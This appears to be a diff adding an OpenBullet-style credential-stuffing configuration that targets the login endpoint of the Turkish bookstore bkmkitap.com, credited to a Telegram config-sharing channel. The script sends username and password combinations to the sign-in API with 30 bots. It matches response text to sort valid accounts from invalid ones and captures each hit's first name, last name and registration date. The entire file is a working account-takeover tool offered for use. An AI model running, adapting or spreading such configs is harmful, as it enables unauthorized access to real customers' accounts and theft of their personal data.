@@ -1,0 +1,88 @@
+[SETTINGS]
+{
+  "Name": "BKM Kitap",
+  "SuggestedBots": 30,
+  "MaxCPM": 0,
+  "LastModified": "2022-07-18T23:51:57.3514554+03:00",
+  "AdditionalInfo": "EAM Tarafından t.me/ConfigZZers Özel Kodlanmıştır",
+  "Author": " e a m",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Proxyless Olarak Bots 30'da Tarayın",
+      "VariableName": "",
+      "Id": 481547459
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#@ConfigZZers REQUEST POST "https://www.bkmkitap.com/srv/customer/signin/email/<USER>" 
+  CONTENT "password=<PASS>&vendor=0&security=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.bkmkitap.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 40" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36 OPR/68.0.3618.206" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Origin: https://www.bkmkitap.com" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://www.bkmkitap.com/uye-girisi-sayfasi" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7" 
+
+#@ConfigZZers KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "E-mail veya \\u015fifre bilgileriniz hatal\\u0131." 
+  KEYCHAIN Success OR 
+    KEY "Ba\\u015far\\u0131yla giri\\u015f yapt\\u0131n\\u0131z" 
+
+#@ConfigZZers PARSE "<SOURCE>" JSON "customer_first_name" CreateEmpty=FALSE -> CAP "İsim" 
+
+#@ConfigZZers PARSE "<SOURCE>" JSON "customer_last_name" CreateEmpty=FALSE -> CAP "Soyisim" 
+
+#@ConfigZZers PARSE "<SOURCE>" JSON "customer_register_date" CreateEmpty=FALSE -> CAP "Kayıt Tarihi" 
+
